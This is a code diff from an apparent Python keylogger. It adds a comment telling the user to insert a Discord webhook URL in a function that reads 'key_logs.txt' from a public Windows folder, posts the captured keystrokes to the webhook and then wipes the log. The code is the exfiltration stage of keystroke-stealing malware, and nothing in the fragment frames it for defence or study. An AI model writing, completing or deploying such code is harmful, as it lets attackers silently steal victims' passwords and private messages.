@@ -10,7 +10,7 @@ file_log = os.path.join("C:\\Users\\Public", "key_logs.txt")
 def send_to_discord(file_log):
     with open(file_log, 'r') as file:
         data = file.read()
-    webhook_url = 'https://YOUR_WEBHOOK_URL_HERE.com/' #
+    webhook_url = 'https://YOUR_WEBHOOK_URL_HERE.com/' # replace this with your discord webhook url
     response = requests.post(webhook_url, data=json.dumps({"content": data}), headers={"Content-Type": "application/json"})
     print(response.status_code)
     open(file_log, 'w').close()
